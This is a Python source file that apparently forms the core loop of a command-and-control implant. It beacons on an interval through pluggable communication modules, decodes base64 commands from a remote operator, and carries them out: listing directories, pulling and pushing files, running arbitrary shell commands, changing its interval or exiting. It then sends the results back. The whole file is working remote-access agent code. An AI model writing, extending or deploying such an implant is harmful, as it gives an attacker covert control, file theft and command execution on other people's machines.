#!/usr/bin/python3

from base64 import  b64encode, b64decode
from time import time, sleep
import configparser
import importlib
import os
import shlex
import sys

from commands import commands

# Global definitions
SETTINGS_FILE = "settings.ini"
COMMS_DIR = "comms"


class core:
    def __init__(self):
        self.params = {} # Init parameters
        self.classes = [] # Imported classes
        self.mods = {} # Initialized communications modules

        # Read settings into self.params
        config = configparser.ConfigParser()
        config.read(SETTINGS_FILE)
        sections = config.sections()
        for s in sections:
            self.params[s] = dict(config.items(s))

        # Define a few class variables
        self.interval = int(self.params["core"]["default_interval"])
        self.platform = self.params["core"]["default_platform"]
        self.next_beacon = int(time()) + self.interval
        self.prev_beacon = 0
        
        # Dynamically import comms modules
        beacon_files = os.listdir(COMMS_DIR)
        for b in beacon_files:
            if (not b in ("__pycache__", "__init__.py", "template.py") and \
                    b.endswith(".py")):
                new_class = getattr(
                    importlib.import_module(COMMS_DIR + "." + b[:-3]), b[:-3])
                self.classes.append(new_class)

    def do_beacon(self):
        """
        Receive commands, then execute them and return the results
        """
        print("Beaconing...")
        cmds = self.mods[self.platform].receive()

        while cmds:
            cmd_full = b64decode(cmds.pop())
            print("Processing:")
            print(cmd_full)
            cmd = cmd_full[:3].decode("utf-8")
            cmd_args = cmd_full[3:]

            if cmd == "DIR":
                cmd_args = cmd_args.decode("utf-8")
                result = commands.do_dir(cmd_args)
            elif cmd == "GET":
                cmd_args = cmd_args.decode("utf-8")
                result = commands.do_get(cmd_args)
            elif cmd == "PUT":
                # TODO This command could take multiple messages, or be binary
                cmd_args = cmd_args.decode("utf-8")
                cmd_args = cmd_args.split(" ", 1)
                result = commands.do_put(cmd_args[0], cmd_args[1])
                pass
            elif cmd == "EXE":
                cmd_args = str(cmd_args.decode("utf-8"))
                cmd_args = shlex.split(cmd_args)
                result = commands.do_exec(cmd_args)
            elif cmd == "DIE":
                result = commands.do_die()
            elif cmd == "INT":
                new_interval = int(cmd_args.decode("utf-8"))
                result = commands.do_interval(self, new_interval)
            else:
                result = b"Invalid command"

            result = b64encode(result)
            self.mods[self.platform].send(
                self.mods[self.platform].target,
                cmd,
                result
            )
            if cmd == "DIE":
                sys.exit()

        self.prev_beacon = self.next_beacon
        self.next_beacon = int(time()) + self.interval

    def run_core(self):
        """
        Initialize all communications classes, 
        then run the main process loop
        """
        # Initialize all comms classes with their respective params
        for c in self.classes:
            name = c.__name__
            self.mods[name] = c(self.params[name])

        while True:
            sleep(5)
            if int(time()) >= self.next_beacon:
                self.do_beacon()


def main():
    test = core()
    test.run_core()


if __name__ == "__main__":
    main()
